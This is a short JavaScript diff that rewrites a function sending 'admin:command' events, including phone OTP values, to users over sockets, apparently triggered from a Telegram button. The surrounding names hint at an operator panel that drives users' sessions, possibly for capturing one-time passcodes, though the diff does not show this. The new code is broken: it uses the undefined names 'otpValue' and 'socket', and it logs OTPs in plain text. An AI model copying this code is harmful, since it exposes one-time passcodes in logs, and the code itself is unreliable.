@@ -395,9 +395,14 @@ function blockedRedirect(db) {
   };
 }
 
-function handleAdminCommand({ userId, command, otp, io }) {
+function handleAdminCommand({ userId, command, otp }) {
   // same code your dashboard uses
-  io.to(userId).emit("admin:command", { command, otp });
+  console.log("handling command:", userId, command)
+  const payload = { userId, command };
+    if (command === "phone-otp" && otpValue) payload.otp = otpValue;
+
+    socket.emit("admin:command", payload);
+    console.log(`📤 command '${command}' to user ${userId} by Tg button`, payload);
 }
 
 async function isAutopilotOn(db) {
